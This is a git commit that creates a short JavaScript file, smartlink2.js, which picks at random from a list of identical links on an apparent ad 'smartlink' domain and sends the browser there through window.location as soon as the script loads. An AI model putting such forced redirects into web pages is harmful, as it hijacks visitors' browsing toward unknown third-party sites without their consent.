b6e9de875fe06423e992b5ef2e85bf67aa8a0cc0
Angga Nurf <31128877+angganurf@users.noreply.github.com>
2026-03-18 23:46:53 +0700

    Create smartlink2.js

---
+++ smartlink2.js
@@ -0,0 +1,9 @@
+var dataUrl = [
+
+'https://cockygoodness.com/jg8jyya1ai?key=9b8ad9bfc9195e566c757b3203e4208f',
+'https://cockygoodness.com/jg8jyya1ai?key=9b8ad9bfc9195e566c757b3203e4208f',
+'https://cockygoodness.com/jg8jyya1ai?key=9b8ad9bfc9195e566c757b3203e4208f'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
